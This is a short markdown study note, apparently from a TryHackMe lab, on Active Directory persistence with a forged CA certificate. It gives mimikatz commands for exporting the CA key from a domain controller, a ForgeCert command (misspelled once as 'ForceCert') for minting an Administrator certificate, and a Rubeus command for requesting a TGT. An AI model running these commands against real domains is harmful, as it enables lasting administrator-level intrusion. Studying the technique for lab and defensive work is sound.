#mimikatz #rubeus 
- We can use certificates to maintain persistence
- Valid certificate can be used for client authentication to get TGT.
- To prevent this form persistence, blue team needs to revoke the certificate. This is the only way to defend.
# Exploitation
- We need to get the private key of the root CA's certificate, after which we can create our own certificate.
- Usually the key is protected by the HSM (Hardware Security Module).
- If HSM is not used, [DPAPI](../../Windows/Windows%20Internals/Uncategorized/DPAPI.md) is used. In such case we can use mimikatz and other tools.
- List certificates stored on the Domain Controller using mimikatz
```powershell
crypto::certificates /systemstore:local_machine
```
- Patching to make the private key exportable
```powershell
privilege::debug
crypto::capi
crypto::cng
```
- Exporting the certificates now
```powershell
crypto::certificates /systemstore:local_machine
# this will export the certificate in .der and .pfx format
# password for these CA cert is "mimikatz"
```
- Now we can sign our own certificate using the `ForgeCert.exe` tool.
```powershell
.\ForceCert.exe --CaCertPath ca-cert.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Passw0rd123
```
- The new certificate can be used to ask for a TGT from the domain controller
```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Passw0rd123 /outfile:tgt.kirbi /domain:za.tryhackme.loc /dc:10.10.10.10
```